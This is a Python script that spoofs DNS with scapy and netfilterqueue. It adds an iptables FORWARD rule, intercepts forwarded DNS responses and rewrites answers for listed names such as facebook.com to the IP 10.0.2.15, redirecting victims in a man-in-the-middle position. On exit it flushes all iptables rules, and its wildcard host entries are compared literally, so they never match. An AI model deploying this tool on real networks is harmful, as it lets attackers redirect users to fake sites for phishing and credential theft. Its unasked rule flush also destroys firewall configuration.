#importing modules
import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import os

# creating dictionary
hosts = {
    b"www.*.": "10.0.2.15",
    b"*.com": "10.0.2.15",
    b"facebook.com.": "10.0.2.15"
}

#function for handling user input
def pkt_process(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):

        print("[Before Modification ]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[After Modification ]:", scapy_packet.summary())
        packet.set_payload(bytes(scapy_packet))
    # accepting packets    
    packet.accept()

# function for modification of packets
def modify_packet(packet):
    qname = packet[scapy.DNSQR].qname
    if qname not in hosts:
        print("Invalid DNS Host:", qname)
        return packet
    packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=hosts[qname])
    packet[scapy.DNS].ancount = 1
    
    #deleting some fields
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].len
    del packet[scapy.UDP].chksum

    return packet
QUEUE_NUM = 123
# insert the iptables FORWARD rule
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
q = NetfilterQueue()
try:
    q.bind(QUEUE_NUM, pkt_process)
    q.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
